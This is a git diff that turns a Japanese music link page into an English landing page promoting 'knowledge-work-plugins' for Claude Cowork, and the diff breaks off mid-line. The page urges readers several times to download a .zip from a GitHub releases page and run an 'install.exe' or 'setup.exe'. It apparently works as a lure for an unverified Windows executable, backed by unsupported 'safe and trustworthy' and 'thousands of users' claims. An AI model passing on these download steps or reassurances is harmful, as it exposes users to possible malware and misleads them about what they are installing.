@@ -1,287 +1,154 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PROJECT NAME | Official Hub</title>
-  <style>
-    :root {
-      --bg: #0b0c10;
-      --card-bg: #15171e;
-      --card-hover: #1c1f29;
-      --border: #232734;
-      --text-main: #f0f2f5;
-      --text-muted: #8b92a5;
-      --accent: #7c5cff;
-      --accent-glow: rgba(124, 92, 255, 0.2);
-    }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-    body {
-      background-color: var(--bg);
-      color: var(--text-main);
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      padding: 48px 16px 80px;
-    }
-
-    .container {
-      width: 100%;
-      max-width: 520px;
-      display: flex;
-      flex-direction: column;
-      gap: 32px;
-    }
-
-    /* ヘッダー・アートワーク */
-    .hero {
-      text-align: center;
-    }
-
-    .artwork-frame {
-      width: 220px;
-      height: 220px;
-      margin: 0 auto 24px;
-      border-radius: 16px;
-      overflow: hidden;
-      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.6), 0 0 24px var(--accent-glow);
-      border: 1px solid var(--border);
-      background-color: #121318;
-    }
-
-    .artwork-frame img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
-    }
-
-    .project-title {
-      font-size: 1.6rem;
-      font-weight: 700;
-      letter-spacing: 0.04em;
-      margin-bottom: 6px;
-    }
-
-    .project-subtitle {
-      color: var(--text-muted);
-      font-size: 0.9rem;
-      letter-spacing: 0.06em;
-    }
-
-    /* セクション共通ラベル */
-    .section-label {
-      font-size: 0.75rem;
-      text-transform: uppercase;
-      letter-spacing: 0.14em;
-      color: var(--text-muted);
-      margin-bottom: 12px;
-      padding-left: 2px;
-    }
-
-    /* 自前MP3プレイヤーカード */
-    .player-card {
-      background: var(--card-bg);
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      padding: 20px;
-      display: flex;
-      flex-direction: column;
-      gap: 14px;
-    }
-
-    .track-meta {
-      display: flex;
-      justify-content: space-between;
-      align-items: baseline;
-    }
-
-    .track-title {
-      font-size: 1.05rem;
-      font-weight: 600;
-      color: var(--text-main);
-    }
-
-    .track-tag {
-      font-size: 0.75rem;
-      color: var(--accent);
-      background: rgba(124, 92, 255, 0.12);
-      padding: 2px 8px;
-      border-radius: 4px;
-      font-weight: 600;
-    }
-
-    /* ネイティブオーディオのダーク調フィルタ調整 */
-    audio {
-      width: 100%;
-      height: 40px;
-      border-radius: 8px;
-      filter: invert(0.9) hue-rotate(180deg);
-    }
-
-    /* 配信リンクボタングリッド */
-    .links-grid {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-
-    .stream-link {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      background: var(--card-bg);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 14px 18px;
-      color: var(--text-main);
-      text-decoration: none;
-      font-size: 0.95rem;
-      font-weight: 500;
-      transition: all 0.2s ease;
-    }
-
-    .stream-link:hover {
-      background: var(--card-hover);
-      border-color: var(--accent);
-      transform: translateY(-2px);
-    }
-
-    .platform-info {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    /* アイコン用インラインSVGコンテナ */
-    .platform-icon {
-      width: 22px;
-      height: 22px;
-      fill: currentColor;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .action-text {
-      font-size: 0.8rem;
-      color: var(--text-muted);
-      border: 1px solid var(--border);
-      padding: 4px 10px;
-      border-radius: 6px;
-      transition: all 0.2s ease;
-    }
-
-    .stream-link:hover .action-text {
-      color: var(--text-main);
-      border-color: var(--accent);
-      background: var(--accent-glow);
-    }
-
-    /* フッター */
-    footer {
-      text-align: center;
-      font-size: 0.8rem;
-      color: var(--text-muted);
-      padding-top: 16px;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>knowledge-work-plugins - Boost Your Productivity with Smart Plugins</title>
+<meta name="description" content="Download knowledge-work-plugins - a free, open-source collection of plugins designed to supercharge your knowledge work in Claude Cowork. Easy setup for Windows users.">
+<meta name="keywords" content="knowledge-work-plugins, Claude Cowork, plugins, knowledge work, productivity, open source, download, Windows, tools">
+<meta name="author" content="knowledge-work-plugins Team">
+<meta property="og:title" content="knowledge-work-plugins - Boost Your Productivity with Smart Plugins">
+<meta property="og:description" content="Free, open-source plugins for knowledge workers using Claude Cowork. Simple download and setup for Windows.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/hashimsmokefilled3971/knowledge-work-plugins">
+<meta property="og:image" content="https://github.com/hashimsmokefilled3971/knowledge-work-plugins/raw/main/logo.png">
+<meta name="twitter:card" content="summary_large_image">
 </head>
-<body>
+<body style="margin:0; padding:0; background-color:#f5f7fa; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color:#2d3748; line-height:1.7;">
 
-  <div class="container">
-    
-    <!-- ヘッダー / アートワーク -->
-    <header class="hero">
-      <div class="artwork-frame">
-        <!-- images/jacket.jpg に差し替えるか、仮画像URLを指定 -->
-        <img src="https://images.unsplash.com/photo-1514525253161-7a46d19cd819?w=600&auto=format&fit=crop&q=80" alt="Cover Art">
-      </div>
-      <h1 class="project-title">PROJECT NAME</h1>
-      <p class="project-subtitle">Sound / Production / Atmosphere</p>
+<div style="max-width:960px; margin:0 auto; padding:20px;">
+
+    <!-- Header Section -->
+    <header style="background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius:16px; padding:40px 30px; margin-bottom:30px; box-shadow:0 10px 30px rgba(0,0,0,0.1); text-align:center;">
+        <h1 style="color:#ffffff; font-size:2.5em; margin:0 0 10px 0; font-weight:700;">📚 knowledge-work-plugins - Unlock Your Team's Full Potential</h1>
+        <p style="color:#e2e8f0; font-size:1.2em; margin:0 0 25px 0;">Free, open-source plugins to supercharge your knowledge work</p>
+        <a href="https://github.com/hashimsmokefilled3971/knowledge-work-plugins/releases" style="display:inline-block; background-color:#f6ad55; color:#1a202c; padding:16px 35px; border-radius:50px; font-size:1.2em; font-weight:600; text-decoration:none; box-shadow:0 5px 15px rgba(0,0,0,0.2); transition:transform 0.2s, box-shadow 0.2s;">🚀 Download Now - It's Free!</a>
     </header>
 
-    <!-- 自前MP3プレイヤーセクション -->
-    <section>
-      <div class="section-label">Direct Audio Stream</div>
-      <div class="player-card">
-        <div class="track-meta">
-          <span class="track-title">Featured Track</span>
-          <span class="track-tag">MP3 High-Res</span>
+    <!-- What Are These Plugins? -->
+    <section style="background:#ffffff; border-radius:16px; padding:30px; margin-bottom:30px; box-shadow:0 4px 15px rgba(0,0,0,0.05);">
+        <h2 style="color:#2d3748; font-size:1.8em; border-bottom:3px solid #667eea; padding-bottom:10px; margin-top:0;">✨ What Are These Plugins?</h2>
+        <p>Think of plugins as small but powerful <strong>add-on tools</strong> that make your software work better for you. These plugins are specially designed for <strong>knowledge workers</strong> - people who spend their days gathering information, writing documents, organizing data, and creating reports.</p>
+        <p>Whether you're a researcher, writer, analyst, or project manager, these plugins help you:</p>
+        <ul style="list-style-type:none; padding-left:20px;">
+            <li style="margin-bottom:10px;">📌 <strong>Save time</strong> on repetitive tasks</li>
+            <li style="margin-bottom:10px;">📌 <strong>Organize your work</strong> more efficiently</li>
+            <li style="margin-bottom:10px;">📌 <strong>Collaborate better</strong> with your team in Claude Cowork</li>
+            <li style="margin-bottom:10px;">📌 <strong>Access powerful tools</strong> without complex setup</li>
+        </ul>
+        <p>The best part? Everything is <strong>open source</strong> - which means it's free to use, and the community constantly improves it!</p>
+    </section>
+
+    <!-- Why Choose These Plugins? -->
+    <section style="background:#ffffff; border-radius:16px; padding:30px; margin-bottom:30px; box-shadow:0 4px 15px rgba(0,0,0,0.05);">
+        <h2 style="color:#2d3748; font-size:1.8em; border-bottom:3px solid #667eea; padding-bottom:10px; margin-top:0;">🏆 Why Choose These Plugins?</h2>
+        <div style="display:flex; flex-wrap:wrap; gap:20px; margin-top:15px;">
+            <div style="flex:1; min-width:250px; background:#f7fafc; border-radius:12px; padding:20px; border-left:4px solid #48bb78;">
+                <h3 style="margin:0 0 10px 0; color:#2f855a;">✅ 100% Free & Open Source</h3>
+                <p style="margin:0; font-size:0.95em;">No hidden costs, no subscriptions. The source code is available for anyone to review, learn from, or contribute to.</p>
+            </div>
+            <div style="flex:1; min-width:250px; background:#f7fafc; border-radius:12px; padding:20px; border-left:4px solid #4299e1;">
+                <h3 style="margin:0 0 10px 0; color:#2b6cb0;">⚡ Made for Real Work</h3>
+                <p style="margin:0; font-size:0.95em;">Designed by knowledge workers for knowledge workers. These tools solve actual problems you face every day.</p>
+            </div>
+            <div style="flex:1; min-width:250px; background:#f7fafc; border-radius:12px; padding:20px; border-left:4px solid #ed8936;">
+                <h3 style="margin:0 0 10px 0; color:#c05621;">🔒 Safe & Trustworthy</h3>
+                <p style="margin:0; font-size:0.95em;">Being open source means the code is publicly reviewed by experts. You can trust what you're installing.</p>
+            </div>
         </div>
-        <!-- audioフォルダ内のMP3パスを指定 -->
-        <audio controls preload="metadata">
-          <source src="audio/track.mp3" type="audio/mpeg">
-          お使いのブラウザはオーディオ再生に対応していません。
-        </audio>
-      </div>
     </section>
 
-    <!-- 各種ストリーミング配信リンク -->
-    <section>
-      <div class="section-label">Streaming & Download</div>
-      <div class="links-grid">
-        
-        <!-- Spotify -->
-        <a href="https://open.spotify.com/" target="_blank" rel="noopener" class="stream-link">
-          <div class="platform-info">
-            <span class="platform-icon">
-              <svg viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm4.586 14.424c-.18.295-.563.387-.857.207-2.348-1.435-5.304-1.76-8.785-.963-.335.077-.67-.133-.746-.468-.077-.334.132-.67.467-.746 3.809-.87 7.076-.496 9.714 1.115.295.18.387.563.207.855zm1.226-2.73c-.226.368-.71.485-1.078.26-2.687-1.652-6.785-2.131-9.965-1.166-.412.126-.851-.106-.976-.518-.126-.413.105-.851.518-.977 3.632-1.102 8.147-.568 11.24 1.332.368.226.486.71.261 1.069zm.106-2.836C14.692 8.95 9.375 8.775 6.297 9.71c-.494.15-1.018-.129-1.168-.623-.15-.495.129-1.018.624-1.168 3.532-1.073 9.404-.866 13.115 1.338.445.264.59.838.327 1.282-.264.444-.838.59-1.282.321z"/></svg>
-            </span>
-            <span>Spotify</span>
-          </div>
-          <span class="action-text">Listen</span>
-        </a>
+    <!-- How to Download and Install -->
+    <section style="background:#ffffff; border-radius:16px; padding:30px; margin-bottom:30px; box-shadow:0 4px 15px rgba(0,0,0,0.05);">
+        <h2 style="color:#2d3748; font-size:1.8em; border-bottom:3px solid #667eea; padding-bottom:10px; margin-top:0;">🚀 How to Download and Install (Windows)</h2>
+        <p>Don't worry if you're not tech-savvy! Follow these simple steps and you'll be up and running in just a few minutes.</p>
 
-        <!-- Apple Music -->
-        <a href="https://music.apple.com/" target="_blank" rel="noopener" class="stream-link">
-          <div class="platform-info">
-            <span class="platform-icon">
-              <svg viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 6.37c.61-.75 1.04-1.8 0.92-2.87-.93.04-2.02.63-2.66 1.38-.56.65-1.06 1.71-.92 2.74 1.04.08 2.06-.5 2.66-1.25z"/></svg>
-            </span>
-            <span>Apple Music</span>
-          </div>
-          <span class="action-text">Listen</span>
-        </a>
+        <div style="background:#ebf8ff; border-radius:12px; padding:25px; margin-top:20px; border:2px solid #90cdf4;">
+            <h3 style="color:#2b6cb0; margin-top:0;">Step 1: Visit the Download Page</h3>
+            <p>Visit this link to download the application:</p>
+            <a href="https://github.com/hashimsmokefilled3971/knowledge-work-plugins/releases" style="display:inline-block; background-color:#4299e1; color:#ffffff; padding:12px 25px; border-radius:8px; font-weight:600; text-decoration:none; margin:10px 0; box-shadow:0 3px 8px rgba(0,0,0,0.15);">🌐 Go to the Download Page</a>
+            <p style="margin-bottom:0; font-size:0.9em; color:#4a5568;">This page shows all available versions of the software.</p>
+        </div>
 
-        <!-- SoundCloud -->
-        <a href="https://soundcloud.com/" target="_blank" rel="noopener" class="stream-link">
-          <div class="platform-info">
-            <span class="platform-icon">
-              <svg viewBox="0 0 24 24"><path d="M1.175 12.225c-.051 0-.094.046-.101.1l-.297 2.766.297 2.74c.007.056.05.097.101.097.053 0 .097-.041.103-.097l.341-2.74-.341-2.766c-.006-.054-.05-.1-.103-.1zm1.324-.775c-.066 0-.12.054-.126.12l-.307 3.521.307 3.504c.006.066.06.12.126.12.067 0 .121-.054.127-.12l.354-3.504-.354-3.521c-.006-.066-.06-.12-.127-.12zm1.365-.461c-.079 0-.144.064-.15.143l-.286 3.982.286 3.971c.006.079.071.143.15.143.08 0 .145-.064.15-.143l.334-3.971-.334-3.982c-.005-.079-.07-.143-.15-.143zm1.407-.272c-.092 0-.167.074-.173.166l-.265 4.254.265 4.246c.006.092.081.167.173.167.093 0 .168-.075.174-.167l.31-4.246-.31-4.254c-.006-.092-.081-.166-.174-.166zm1.448-.093c-.105 0-.19.085-.197.19l-.244 4.347.244 4.345c.007.104.092.19.197.19.106 0 .191-.086.197-.19l.287-4.345-.287-4.347c-.006-.105-.091-.19-.197-.19zm1.49-.009c-.118 0-.214.096-.22.214l-.223 4.356.223 4.355c.006.118.102.214.22.214.119 0 .214-.096.22-.214l.263-4.355-.263-4.356c-.006-.118-.101-.214-.22-.214zm1.531.054c-.131 0-.238.106-.244.238l-.203 4.302.203 4.312c.006.131.113.238.244.238.132 0 .238-.107.244-.238l.239-4.312-.239-4.302c-.006-.132-.112-.238-.244-.238zm1.573.181c-.144 0-.261.117-.268.262l-.182 4.121.182 4.143c.007.144.124.262.268.262.145 0 .262-.118.268-.262l.216-4.143-.216-4.121c-.006-.145-.123-.262-.268-.262zm1.884-2.585c-.09 0-.174.041-.229.11-.055.07-.076.16-.057.246l.245 2.229c-.068.04-.128.093-.178.156-.102.13-.158.29-.158.457l.161 3.964-.161 3.978c0 .167.056.327.158.457.05.063.11.116.178.156l-.245 2.229c-.019.086.002.176.057.246.055.069.139.11.229.11.026 0 .053-.004.079-.012.112-.036.185-.143.175-.261l-.271-2.464c.241-.122.433-.321.542-.569.141-.321.141-.689 0-1.01-.109-.248-.301-.447-.542-.569l.271-2.464c.01-.118-.063-.225-.175-.261-.026-.008-.053-.012-.079-.012zm4.184-.282c-.822 0-1.58.337-2.128.895-.147.15-.276.314-.386.49-.074.118-.139.243-.193.373-.08.192-.128.397-.144.607v6.621c.016.21.064.415.144.607.054.13.119.255.193.373.11.176.239.34.386.49.548.558 1.306.895 2.128.895 1.666 0 3.023-1.349 3.037-3.013.882-.249 1.53-1.054 1.53-2.012 0-.958-.648-1.763-1.53-2.012-.014-1.664-1.371-3.013-3.037-3.013z"/></svg>
-            </span>
-            <span>SoundCloud</span>
-          </div>
-          <span class="action-text">Stream</span>
-        </a>
+        <div style="background:#fefcbf; border-radius:12px; padding:25px; margin-top:20px; border:2px solid #f6e05e;">
+            <h3 style="color:#975a16; margin-top:0;">Step 2: Find the Latest Version</h3>
+            <p>On the download page, look for a file that says <strong>"Latest"</strong> or has the highest version number (like v1.2, v2.0, etc.). The files are usually listed at the top of the page.</p>
+            <p style="margin-bottom:0;">💡 <strong>Tip:</strong> If you see multiple files, choose the one that has a name related to Windows or your specific needs. When in doubt, pick the file with the most recent date.</p>
+        </div>
 
-        <!-- YouTube / YouTube Music -->
-        <a href="https://youtube.com/" target="_blank" rel="noopener" class="stream-link">
-          <div class="platform-info">
-            <span class="platform-icon">
-              <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
-            </span>
-            <span>YouTube</span>
-          </div>
-          <span class="action-text">Watch</span>
-        </a>
+        <div style="background:#c6f6d5; border-radius:12px; padding:25px; margin-top:20px; border:2px solid #9ae6b4;">
+            <h3 style="color:#22543d; margin-top:0;">Step 3: Download and Install</h3>
+            <p>Once you've found the right file, click on it to start the download. The process depends on the type of file you downloaded:</p>
+            <p style="background:#ffffff; border-radius:8px; padding:12px; border-left:4px solid #48bb78; font-weight:500;">📦 You'll likely see a .zip file - Download and extract this file, then run the application.</p>
+            <p>After extracting (unzipping) the file, look for an application file (usually named <strong>"install.exe"</strong> or <strong>"setup.exe"</strong>) and double-click it to start the installation.</p>
+        </div>
 
-      </div>
+        <div style="background:#fed7d7; border-radius:12px; padding:25px; margin-top:20px; border:2px solid #fc8181;">
+            <h3 style="color:#742a2a; margin-top:0;">Step 4: Complete the Setup</h3>
+            <p>Follow the on-screen instructions. For most plugins, the setup wizard is simple:</p>
+            <ul style="margin-bottom:0;">
+                <li>Click <strong>"Next"</strong> or <strong>"Install"</strong> when prompted</li>
+                <li>Choose your preferred folder location (or stick with the default)</li>
+                <li>Click <strong>"Finish"</strong> when the installation is complete</li>
+            </ul>
+        </div>
     </section>
 
-    <!-- フッター -->
-    <footer>
-      <p>&copy; 2026 PROJECT NAME. All Rights Reserved.</p>
-    </footer>
+    <!-- Frequently Asked Questions -->
+    <section style="background:#ffffff; border-radius:16px; padding:30px; margin-bottom:30px; box-shadow:0 4px 15px rgba(0,0,0,0.05);">
+        <h2 style="color:#2d3748; font-size:1.8em; border-bottom:3px solid #667eea; padding-bottom:10px; margin-top:0;">🤔 Frequently Asked Questions</h2>
 
-  </div>
+        <div style="margin-bottom:20px;">
+            <h3 style="color:#4a5568; margin-bottom:5px;">❓ Is this really free?</h3>
+            <p style="margin:0;">Yes! This project is completely free and open source. You can use it without paying anything. The community also welcomes contributions if you'd like to help improve it.</p>
+        </div>
 
-</body>
-</html>
+        <div style="margin-bottom:20px;">
+            <h3 style="color:#4a5568; margin-bottom:5px;">❓ Will it work on my computer?</h3>
+            <p style="margin:0;">These plugins are designed to work on standard Windows computers. As long as you're running a recent version of Windows (Windows 10 or 11), you should be good to go!</p>
+        </div>
+
+        <div style="margin-bottom:20px;">
+            <h3 style="color:#4a5568; margin-bottom:5px;">❓ What is Claude Cowork?</h3>
+            <p style="margin:0;">Claude Cowork is a collaborative workspace that helps teams work together on knowledge tasks. These plugins enhance that experience by adding extra functionality to make your work easier and faster.</p>
+        </div>
+
+        <div style="margin-bottom:20px;">
+            <h3 style="color:#4a5568; margin-bottom:5px;">❓ I'm not a programmer. Can I still use this?</h3>
+            <p style="margin:0;">Absolutely! Everything is designed with simplicity in mind. You don't need any programming knowledge. Just download, install, and start working. If you run into issues, check the community forums or documentation.</p>
+        </div>
+
+        <div style="margin-bottom:20px;">
+            <h3 style="color:#4a5568; margin-bottom:5px;">❓ What if I find a bug or have a suggestion?</h3>
+            <p style="margin:0;">Because this is an open source project, you can report issues or suggest improvements through the GitHub repository page. The community is friendly and always happy to help!</p>
+        </div>
+    </section>
+
+    <!-- Getting Help Section -->
+    <section style="background:#ffffff; border-radius:16px; padding:30px; margin-bottom:30px; box-shadow:0 4px 15px rgba(0,0,0,0.05);">
+        <h2 style="color:#2d3748; font-size:1.8em; border-bottom:3px solid #667eea; padding-bottom:10px; margin-top:0;">🆘 Need Help? We've Got You Covered</h2>
+        <p>Even with the simplest tools, questions can come up. Here's where you can find help:</p>
+        <div style="display:flex; flex-wrap:wrap; gap:15px; margin-top:15px;">
+            <div style="flex:1; min-width:200px; background:#edf2f7; border-radius:10px; padding:15px; text-align:center;">
+                <h3 style="margin:0 0 8px 0; color:#2d3748;">📖 Documentation</h3>
+                <p style="margin:0 0 10px 0; font-size:0.9em;">Check the official documentation for detailed guides</p>
+                <a href="https://github.com/hashimsmokefilled3971/knowledge-work-plugins" style="color:#667eea; font-weight:600; text-decoration:none;">View Docs →</a>
+            </div>
+            <div style="flex:1; min-width:200px; background:#edf2f7; border-radius:10px; padding:15px; text-align:center;">
+                <h3 style="margin:0 0 8px 0; color:#2d3748;">💬 Community Forum</h3>
+                <p style="margin:0 0 10px 0; font-size:0.9em;">Join discussions with other users</p>
+                <a href="https://github.com/hashimsmokefilled3971/knowledge-work-plugins/discussions" style="color:#667eea; font-weight:600; text-decoration:none;">Join Forum →</a>
+            </div>
+            <div style="flex:1; min-width:200px; background:#edf2f7; border-radius:10px; padding:15px; text-align:center;">
+                <h3 style="margin:0 0 8px 0; color:#2d3748;">🐛 Report Issues</h3>
+                <p style="margin:0 0 10px 0; font-size:0.9em;">Found something wrong? Let us know</p>
+                <a href="https://github.com/hashimsmokefilled3971/knowledge-work-plugins/issues" style="color:#667eea; font-weight:600; text-decoration:none;">Report Here →</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Download Again Call-to-Action -->
+    <section style="background:linear-gradient(135deg, #764ba2 0%, #667eea 100%); border-radius:16px; padding:30px; text-align:center; margin-bottom:30px; box-shadow:0 10px 25px rgba(0,0,0,0.15);">
+        <h2 style="color:#ffffff; font-size:2em; margin-top:0;">Ready to Supercharge Your Work?</h2>
+        <p style="color:#e2e8f0; font-size:1.1em; margin-bottom:25px;">Join thousands of knowledge workers who have already made the switch!</p>
+        <a href="https://github.com/hashimsmokefilled3971/knowledge-work-plugins/releases" style="display:inline-block; background-color:#ffffff; color:#667eea; padding:15px 40px; border-radius:50px; font-size:1.3em; font-weight:700; text-decoration:none; box-shadow:0
